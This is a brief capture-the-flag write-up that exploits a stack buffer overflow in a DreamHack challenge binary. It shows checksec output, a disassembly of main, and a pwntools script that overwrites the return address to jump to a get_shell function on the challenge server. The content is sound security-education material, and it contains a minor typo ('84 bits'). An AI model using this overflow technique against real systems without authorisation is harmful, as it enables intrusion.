### Overview
let's checksec file 
```
khanh@ubuntu:~/Documents/WorkSpaceDreamHack/PWN-dreamhack/ReturnAddressOverride$ checksec rao
[*] '/home/khanh/Documents/WorkSpaceDreamHack/PWN-dreamhack/ReturnAddressOverride/rao'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
This challenge doesn't have Canary!
Let's disassemble main function:
```
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x30
   0x00000000004006f0 <+8>:     mov    eax,0x0
   0x00000000004006f5 <+13>:    call   0x400667 <init>
   0x00000000004006fa <+18>:    lea    rdi,[rip+0xbb]        # 0x4007bc
   0x0000000000400701 <+25>:    mov    eax,0x0
   0x0000000000400706 <+30>:    call   0x400540 <printf@plt>
   0x000000000040070b <+35>:    lea    rax,[rbp-0x30]
   0x000000000040070f <+39>:    mov    rsi,rax
   0x0000000000400712 <+42>:    lea    rdi,[rip+0xab]        # 0x4007c4
   0x0000000000400719 <+49>:    mov    eax,0x0
   0x000000000040071e <+54>:    call   0x400570 <__isoc99_scanf@plt>
   0x0000000000400723 <+59>:    mov    eax,0x0
   0x0000000000400728 <+64>:    leave
   0x0000000000400729 <+65>:    ret
End of assembler dump.
```
We can see that the stack alignment in 84 bits architechture spend 0x30 bytes for stack frame
Because buf 0x28 bytes so the remaining 8 bytes is for padding

Thus, to solve this challenge we need to override:
`` 0x30 bytes + 8 bytes saved rbp + return address``

### Exploitation

```py
from pwn import *
p = remote("host3.dreamhack.games", 23351)
elf = ELF("./rao")
payload = b"A"* 0x28 + b"A"*16 + p64(elf.symbols['get_shell'])
p.recvuntil(b"Input: ")
p.sendline(payload)
p.interactive() 
```
